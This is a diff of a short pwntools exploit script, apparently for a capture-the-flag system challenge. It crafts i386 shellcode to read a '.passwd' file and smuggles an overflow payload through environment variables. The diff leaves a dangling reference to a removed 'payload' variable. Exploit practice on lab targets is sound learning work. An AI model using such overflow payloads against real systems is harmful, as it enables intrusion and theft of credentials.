@@ -11,17 +11,13 @@ def toCode(shellcraft):
     return res
 
 context.clear(arch = 'i386')
-
-
 print 'Crafting payload'
-passfile = pwnlib.shellcraft.i386.linux.cat('/challenge/app-systeme/ch8/.passwd').rstrip()
+passfile = pwnlib.shellcraft.i386.linux.cat('.passwd').rstrip()
 print toCode(passfile)
 
-shellcodeLocation = 0xbffffe0f
-payload = 'a'*156 + '\x0f\xfe\xff\xbf'
 
 env = {
-    "HOME": ".",
+    "HOME": "a"*124 + '',
     "USERNAME": ".",
     "SHELL": ".",
     "PATH": payload
